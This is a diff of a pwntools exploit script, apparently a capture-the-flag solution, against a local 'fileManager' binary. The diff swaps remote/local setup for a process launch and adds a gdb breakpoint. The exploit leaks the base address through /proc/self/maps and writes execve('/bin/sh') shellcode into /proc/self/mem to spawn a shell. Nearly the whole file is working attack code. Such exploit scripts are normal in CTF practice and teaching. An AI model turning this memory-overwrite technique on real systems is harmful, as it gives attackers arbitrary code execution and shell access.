@@ -1,20 +1,12 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
 
 from pwn import *
-from time import sleep
-import sys
-context.log_level = "debug"
-context.os = "linux"
-context.arch = "i386"
+context.binary = "./fileManager"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
-if sys.argv[1] == "l":
-    io = process("./fileManager")
-else:
-    #  socat tcp-l:9999,fork exec:./fileManager
-    io = remote("127.0.0.1", 9999)
-    
+io = process("./fileManager")
+
 def read(name, offset, length):
     io.sendlineafter("3. 退出\n", "1")
     io.sendlineafter("模块名称:", name)
@@ -34,6 +26,7 @@ def exp():
     read("/proc/self/maps", 0, 0x100)
     base_addr = int(io.recvuntil("-", drop = True), 16)
     info("base_addr -> 0x%x" % base_addr)
+    gdb.attach(io, "b *{} + 0x10C8\nc".format(base_addr))
     address = base_addr + 0x1154
     shellcode = asm(shellcraft.execve("/bin/sh"))
     write("/proc/self/mem", address, 0x100, shellcode)
@@ -43,7 +36,3 @@ def exp():
 
 if __name__ == "__main__":
     exp()
-
-
-
-
